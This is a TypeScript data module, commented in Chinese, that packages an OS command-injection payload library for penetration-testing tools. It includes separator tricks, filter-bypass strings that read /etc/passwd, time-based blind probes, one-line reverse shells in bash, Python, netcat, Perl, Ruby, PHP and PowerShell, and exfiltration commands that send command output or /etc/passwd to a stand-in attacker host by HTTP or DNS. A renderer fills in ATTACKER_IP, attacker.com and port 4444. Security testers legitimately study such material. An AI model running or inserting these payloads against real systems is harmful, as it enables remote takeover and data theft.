/**
 * 命令注入 Payload 数据集
 * 用于渗透测试中的操作系统命令注入漏洞验证
 * 按注入手法分类：命令分隔符、空格绕过、关键字绕过、盲注、反弹 Shell、数据外带
 */

// ================ 类型定义 ================ //

export interface CmdPayload {
    /** 唯一标识 */
    id: string
    /** Payload 名称 */
    name: string
    /** 实际 Payload 内容，{cmd} 为用户自定义命令占位符 */
    payload: string
    /** 所属分类 ID */
    category: string
    /** 适用平台: all | linux | windows */
    platform: "all" | "linux" | "windows"
    /** 可选描述信息 */
    description?: string
}

export interface CmdCategory {
    /** 分类 ID */
    id: string
    /** 分类中文名 */
    name: string
    /** 分类英文名 */
    nameEn: string
    /** 该分类下的 payload 列表 */
    payloads: CmdPayload[]
}

// ================ 分类定义 ================ //

/**
 * 命令分隔符 —— 利用 shell 分隔符将恶意命令拼接到合法命令后
 */
const separator: CmdCategory = {
    id: "separator",
    name: "命令分隔符",
    nameEn: "Command Separators",
    payloads: [
        { id: "sep-semicolon", name: "分号 (;)", payload: `; {cmd}`, category: "separator", platform: "all", description: "最常用的 Linux 命令分隔符" },
        { id: "sep-pipe", name: "管道 (|)", payload: `| {cmd}`, category: "separator", platform: "all", description: "将前一命令输出作为后一命令输入" },
        { id: "sep-or", name: "逻辑或 (||)", payload: `|| {cmd}`, category: "separator", platform: "all", description: "前一命令失败时执行（短路求值）" },
        { id: "sep-and", name: "逻辑与 (&&)", payload: `&& {cmd}`, category: "separator", platform: "all", description: "前一命令成功时执行" },
        { id: "sep-amp", name: "后台执行 (&)", payload: `& {cmd}`, category: "separator", platform: "all", description: "后台执行，不等待前一命令完成" },
        { id: "sep-newline", name: "换行 (\\n)", payload: `\n{cmd}`, category: "separator", platform: "linux", description: "换行符作为命令分隔" },
        { id: "sep-newline-url", name: "换行 URL 编码 (%0a)", payload: `%0a{cmd}`, category: "separator", platform: "linux", description: "URL 编码的换行符" },
        { id: "sep-cr-url", name: "回车 URL 编码 (%0d)", payload: `%0d{cmd}`, category: "separator", platform: "linux" },
        { id: "sep-backtick", name: "反引号命令替换", payload: "`{cmd}`", category: "separator", platform: "linux", description: "反引号内的命令会先执行" },
        { id: "sep-dollar-paren", name: "$() 命令替换", payload: "$({cmd})", category: "separator", platform: "linux", description: "现代 shell 推荐的命令替换语法" },
        { id: "sep-sub-shell", name: "$() 嵌套到参数", payload: "valid_cmd $({cmd})", category: "separator", platform: "linux", description: "将命令替换嵌入到合法命令参数中" },
        { id: "sep-1a", name: "控制字符 (%1a)", payload: `%1a{cmd}`, category: "separator", platform: "all", description: "SUB 控制字符，某些解析器视为分隔符" },
        { id: "sep-win-amp", name: "Windows & 分隔", payload: `& {cmd}`, category: "separator", platform: "windows", description: "Windows cmd.exe 命令分隔符" },
        { id: "sep-win-pipe", name: "Windows 管道", payload: `| {cmd}`, category: "separator", platform: "windows" },
        { id: "sep-win-caret-newline", name: "Windows ^ 续行", payload: `^\n{cmd}`, category: "separator", platform: "windows", description: "Windows 中 ^ 是续行符" },
    ],
}

/**
 * 空格绕过 —— 当空格被过滤时使用的替代字符
 */
const spaceBypass: CmdCategory = {
    id: "space_bypass",
    name: "空格绕过",
    nameEn: "Space Bypass",
    payloads: [
        { id: "sp-ifs", name: "${IFS} 替代空格", payload: "cat${IFS}/etc/passwd", category: "space_bypass", platform: "linux", description: "IFS（内部字段分隔符）默认包含空格" },
        { id: "sp-ifs9", name: "$IFS$9 替代空格", payload: "cat$IFS$9/etc/passwd", category: "space_bypass", platform: "linux", description: "$9 是空的位置参数，用于截断变量名" },
        { id: "sp-tab-url", name: "Tab (%09)", payload: `cat%09/etc/passwd`, category: "space_bypass", platform: "linux", description: "Tab 字符在大多数 shell 中等效于空格" },
        { id: "sp-brace", name: "花括号 {cmd,arg}", payload: `{cat,/etc/passwd}`, category: "space_bypass", platform: "linux", description: "Bash 花括号展开，逗号分隔参数" },
        { id: "sp-lt", name: "重定向 < 替代", payload: `cat</etc/passwd`, category: "space_bypass", platform: "linux", description: "输入重定向符号不需要前置空格" },
        { id: "sp-ltgt", name: "<> 替代空格", payload: `cat<>/etc/passwd`, category: "space_bypass", platform: "linux", description: "读写方式打开文件" },
        { id: "sp-hex-20", name: "\\x20 十六进制空格", payload: "cat$'\\x20'/etc/passwd", category: "space_bypass", platform: "linux", description: "$'' ANSI-C 引用中的十六进制空格" },
        { id: "sp-url-20", name: "%20 URL 编码空格", payload: `cat%20/etc/passwd`, category: "space_bypass", platform: "all", description: "URL 编码的空格字符" },
        { id: "sp-plus", name: "+ 号替代 (URL)", payload: `cat+/etc/passwd`, category: "space_bypass", platform: "all", description: "URL 中加号常被解析为空格" },
        { id: "sp-ifs-custom", name: "自定义 IFS", payload: `IFS=,;cat,/etc/passwd`, category: "space_bypass", platform: "linux", description: "修改 IFS 为逗号后，逗号即可作为分隔符" },
        { id: "sp-win-comma", name: "Windows 逗号替代", payload: `type,C:\\windows\\win.ini`, category: "space_bypass", platform: "windows", description: "Windows 中逗号可代替空格" },
        { id: "sp-win-semicolon", name: "Windows 分号替代", payload: `type;C:\\windows\\win.ini`, category: "space_bypass", platform: "windows" },
    ],
}

/**
 * 关键字绕过 —— 当命令关键字（如 cat、whoami）被过滤时的规避手法
 */
const keywordBypass: CmdCategory = {
    id: "keyword_bypass",
    name: "关键字绕过",
    nameEn: "Keyword Bypass",
    payloads: [
        { id: "kw-wildcard-1", name: "通配符 (?)", payload: `/???/c?t /etc/passwd`, category: "keyword_bypass", platform: "linux", description: "? 匹配单个字符，/bin/cat → /???/c?t" },
        { id: "kw-wildcard-2", name: "通配符 (passwd)", payload: `/???/c?t /???/??ss??`, category: "keyword_bypass", platform: "linux", description: "对参数路径也使用通配符" },
        { id: "kw-wildcard-glob", name: "通配符 (*)", payload: `/bin/ca* /etc/pass*`, category: "keyword_bypass", platform: "linux", description: "* 匹配任意长度字符串" },
        { id: "kw-single-quote", name: "单引号分割", payload: `w'h'o'a'm'i`, category: "keyword_bypass", platform: "linux", description: "Shell 会自动拼接相邻的引号字符串" },
        { id: "kw-double-quote", name: "双引号分割", payload: `w"h"o"a"m"i"`, category: "keyword_bypass", platform: "linux", description: "双引号内的内容会被当作一个整体" },
        { id: "kw-backslash", name: "反斜杠分割", payload: `wh\\oami`, category: "keyword_bypass", platform: "linux", description: "反斜杠转义后的字符等于原字符" },
        { id: "kw-dollar-at", name: "$@ 空变量插入", payload: "wh$@oami", category: "keyword_bypass", platform: "linux", description: "$@ 在无参数时展开为空字符串" },
        { id: "kw-dollar-empty", name: "${var} 空变量", payload: "who${z}ami", category: "keyword_bypass", platform: "linux", description: "未定义变量展开为空" },
        { id: "kw-dollar-star", name: "$* 空参数", payload: "who$*ami", category: "keyword_bypass", platform: "linux" },
        { id: "kw-dollar-num", name: "$1$2 空位置参数", payload: "wh$1oam$2i", category: "keyword_bypass", platform: "linux" },
        { id: "kw-var-sub", name: "变量拼接执行", payload: "a=who;b=ami;$a$b", category: "keyword_bypass", platform: "linux", description: "将命令拆分到多个变量再拼接执行" },
        { id: "kw-rev", name: "rev 反转命令", payload: `echo 'dma1ohw' | rev`, category: "keyword_bypass", platform: "linux", description: "先反转字符串再通过 rev 还原执行" },
        { id: "kw-base64", name: "Base64 编码执行", payload: `echo d2hvYW1p | base64 -d | bash`, category: "keyword_bypass", platform: "linux", description: "Base64 编码 whoami 后解码执行" },
        { id: "kw-base64-inline", name: "Base64 内联解码", payload: "$(echo d2hvYW1p | base64 -d)", category: "keyword_bypass", platform: "linux" },
        { id: "kw-hex-xxd", name: "十六进制解码执行", payload: `echo 77686f616d69 | xxd -r -p | bash`, category: "keyword_bypass", platform: "linux", description: "十六进制编码 whoami" },
        { id: "kw-printf", name: "printf 八进制", payload: "$(printf '\\167\\150\\157\\141\\155\\151')", category: "keyword_bypass", platform: "linux", description: "使用 printf 八进制转义构造命令" },
        { id: "kw-expr-substr", name: "环境变量截取", payload: "${PATH:0:1}${PATH:5:1}", category: "keyword_bypass", platform: "linux", description: "从 PATH 等环境变量中截取字符拼接命令" },
        { id: "kw-heredoc", name: "Heredoc 传递", payload: `cat<<EOF\n/etc/passwd\nEOF`, category: "keyword_bypass", platform: "linux", description: "利用 heredoc 传递参数绕过检测" },
        { id: "kw-win-caret", name: "Windows ^ 转义", payload: `w^h^o^a^m^i`, category: "keyword_bypass", platform: "windows", description: "Windows ^ 转义符可插入命令任意位置" },
        { id: "kw-win-set", name: "Windows 变量拼接", payload: `set a=who&& set b=ami&& call %a%%b%`, category: "keyword_bypass", platform: "windows", description: "Windows 中通过环境变量拼接命令" },
        { id: "kw-win-dq", name: "Windows 双引号分割", payload: `w"h"o"a"m"i"`, category: "keyword_bypass", platform: "windows" },
        { id: "kw-win-for", name: "Windows FOR 拼接", payload: `cmd /c "for /f %i in ('whoami') do echo %i"`, category: "keyword_bypass", platform: "windows" },
    ],
}

/**
 * 盲注 (时间型) —— 无回显场景下通过时间延迟确认命令执行
 */
const blind: CmdCategory = {
    id: "blind",
    name: "盲注 (时间型)",
    nameEn: "Blind Injection",
    payloads: [
        { id: "blind-sleep-5", name: "sleep 延时", payload: `; sleep 5`, category: "blind", platform: "linux", description: "延时 5 秒确认命令执行" },
        { id: "blind-sleep-10", name: "sleep 10 秒", payload: `; sleep 10`, category: "blind", platform: "linux" },
        { id: "blind-sleep-pipe", name: "管道 + sleep", payload: `| sleep 5`, category: "blind", platform: "linux" },
        { id: "blind-sleep-and", name: "&& sleep", payload: `&& sleep 5`, category: "blind", platform: "linux" },
        { id: "blind-sleep-or", name: "|| sleep (失败触发)", payload: `|| sleep 5`, category: "blind", platform: "linux" },
        { id: "blind-sleep-sub", name: "$() + sleep", payload: "$(sleep 5)", category: "blind", platform: "linux" },
        { id: "blind-sleep-backtick", name: "反引号 + sleep", payload: "`sleep 5`", category: "blind", platform: "linux" },
        { id: "blind-ping", name: "ping 延时 (Linux)", payload: `; ping -c 5 127.0.0.1`, category: "blind", platform: "linux", description: "ping 5 次约耗时 5 秒" },
        { id: "blind-ping-and", name: "ping && 确认", payload: `&& ping -c 3 127.0.0.1`, category: "blind", platform: "linux" },
        { id: "blind-timeout", name: "timeout 命令", payload: `; timeout 5 tail -f /dev/null`, category: "blind", platform: "linux", description: "使用 timeout 精确控制延时" },
        { id: "blind-win-ping", name: "ping 延时 (Windows)", payload: `& ping -n 5 127.0.0.1`, category: "blind", platform: "windows", description: "Windows ping 延时" },
        { id: "blind-win-timeout", name: "Windows timeout", payload: `& timeout /t 5 /nobreak`, category: "blind", platform: "windows" },
        { id: "blind-win-waitfor", name: "Windows waitfor", payload: `& waitfor /t 5 pause`, category: "blind", platform: "windows" },
    ],
}

/**
 * 快捷反弹 Shell —— 常用的一行式反弹 Shell 命令
 * 占位符: {host} = 攻击者 IP, {port} = 监听端口
 */
const reverseShell: CmdCategory = {
    id: "reverse_shell",
    name: "快捷反弹 Shell",
    nameEn: "Quick Reverse Shell",
    payloads: [
        { id: "rs-bash", name: "Bash TCP", payload: `bash -i >& /dev/tcp/{host}/{port} 0>&1`, category: "reverse_shell", platform: "linux", description: "最经典的 Bash 反弹 Shell" },
        { id: "rs-bash-196", name: "Bash 196", payload: `0<&196;exec 196<>/dev/tcp/{host}/{port}; bash <&196 >&196 2>&196`, category: "reverse_shell", platform: "linux", description: "使用文件描述符 196 的变体" },
        { id: "rs-bash-readline", name: "Bash readline", payload: "exec 5<>/dev/tcp/{host}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done", category: "reverse_shell", platform: "linux" },
        { id: "rs-python", name: "Python", payload: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'`, category: "reverse_shell", platform: "linux", description: "Python3 反弹 Shell" },
        { id: "rs-python-short", name: "Python 短版", payload: `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{host}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'`, category: "reverse_shell", platform: "linux" },
        { id: "rs-nc", name: "Netcat -e", payload: `nc -e /bin/bash {host} {port}`, category: "reverse_shell", platform: "linux", description: "需要支持 -e 参数的 nc 版本" },
        { id: "rs-nc-noe", name: "Netcat 无 -e", payload: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {host} {port} >/tmp/f`, category: "reverse_shell", platform: "linux", description: "通过命名管道实现，不需要 -e 支持" },
        { id: "rs-ncat", name: "Ncat", payload: `ncat {host} {port} -e /bin/bash`, category: "reverse_shell", platform: "linux" },
        { id: "rs-perl", name: "Perl", payload: "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", category: "reverse_shell", platform: "linux" },
        { id: "rs-ruby", name: "Ruby", payload: `ruby -rsocket -e'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'`, category: "reverse_shell", platform: "linux" },
        { id: "rs-php", name: "PHP", payload: "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'", category: "reverse_shell", platform: "linux" },
        { id: "rs-powershell", name: "PowerShell", payload: 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'{host}\',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)};$c.Close()"', category: "reverse_shell", platform: "windows", description: "PowerShell TCP 反弹 Shell" },
    ],
}

/**
 * 数据外带 (OOB) —— 无回显场景下通过 DNS/HTTP 请求带出数据
 * 占位符: {domain} = 攻击者域名, {host} = 攻击者 IP
 */
const dataExfil: CmdCategory = {
    id: "data_exfil",
    name: "数据外带 (OOB)",
    nameEn: "Data Exfiltration",
    payloads: [
        { id: "exfil-curl-get", name: "curl GET 外带", payload: "curl http://{host}/?d=$(whoami)", category: "data_exfil", platform: "linux", description: "通过 HTTP GET 参数外带命令输出" },
        { id: "exfil-curl-post", name: "curl POST 外带", payload: 'curl -X POST -d "$(cat /etc/passwd)" http://{host}/', category: "data_exfil", platform: "linux", description: "POST 请求可携带更多数据" },
        { id: "exfil-curl-b64", name: "curl Base64 外带", payload: "curl http://{host}/?d=$(whoami|base64)", category: "data_exfil", platform: "linux", description: "Base64 编码避免特殊字符问题" },
        { id: "exfil-wget", name: "wget 外带", payload: "wget http://{host}/?d=$(whoami) -O /dev/null", category: "data_exfil", platform: "linux" },
        { id: "exfil-dns-nslookup", name: "nslookup DNS 外带", payload: "nslookup $(whoami).{domain}", category: "data_exfil", platform: "all", description: "通过 DNS 查询子域名外带数据，可穿越防火墙" },
        { id: "exfil-dns-dig", name: "dig DNS 外带", payload: "dig $(whoami).{domain}", category: "data_exfil", platform: "linux" },
        { id: "exfil-dns-host", name: "host DNS 外带", payload: "host $(whoami).{domain}", category: "data_exfil", platform: "linux" },
        { id: "exfil-dns-ping", name: "ping DNS 外带", payload: "ping -c 1 $(whoami).{domain}", category: "data_exfil", platform: "linux", description: "ping 也会触发 DNS 查询" },
        { id: "exfil-dns-b64", name: "DNS Base64 外带", payload: "nslookup $(cat /etc/hostname|base64).{domain}", category: "data_exfil", platform: "linux" },
        { id: "exfil-dns-cut", name: "DNS 分段外带", payload: "for i in $(cat /etc/passwd | xxd -p -c 30); do nslookup $i.{domain}; done", category: "data_exfil", platform: "linux", description: "将大文件分段通过 DNS 外带" },
        { id: "exfil-win-nslookup", name: "Windows nslookup 外带", payload: "for /f %i in ('whoami') do nslookup %i.{domain}", category: "data_exfil", platform: "windows" },
        { id: "exfil-win-certutil", name: "Windows certutil 下载", payload: "certutil -urlcache -split -f http://{host}/payload.exe C:\\Windows\\Temp\\payload.exe", category: "data_exfil", platform: "windows", description: "使用 certutil 从远程下载文件" },
        { id: "exfil-win-powershell", name: "PowerShell 外带", payload: 'powershell -c "Invoke-WebRequest -Uri http://{host}/?d=$([System.Environment]::UserName)"', category: "data_exfil", platform: "windows" },
    ],
}

// ================ 导出 ================ //

/** 所有分类列表 */
export const cmdCategories: CmdCategory[] = [
    separator,
    spaceBypass,
    keywordBypass,
    blind,
    reverseShell,
    dataExfil,
]

/**
 * 获取所有 payload 的扁平列表
 */
export function getAllPayloads(): CmdPayload[] {
    return cmdCategories.flatMap(c => c.payloads)
}

/**
 * 替换 payload 中的占位符
 * @param payload - 原始 payload 字符串
 * @param cmd - 用户自定义命令（替换 {cmd}）
 * @param host - 攻击者 IP/域名（替换 {host}）
 * @param port - 监听端口（替换 {port}）
 * @param domain - DNS 外带域名（替换 {domain}）
 */
export function renderPayload(
    payload: string,
    cmd: string = "id",
    host: string = "ATTACKER_IP",
    port: string = "4444",
    domain: string = "attacker.com",
): string {
    return payload
        .replace(/\{cmd\}/g, cmd)
        .replace(/\{host\}/g, host)
        .replace(/\{port\}/g, port)
        .replace(/\{domain\}/g, domain)
}
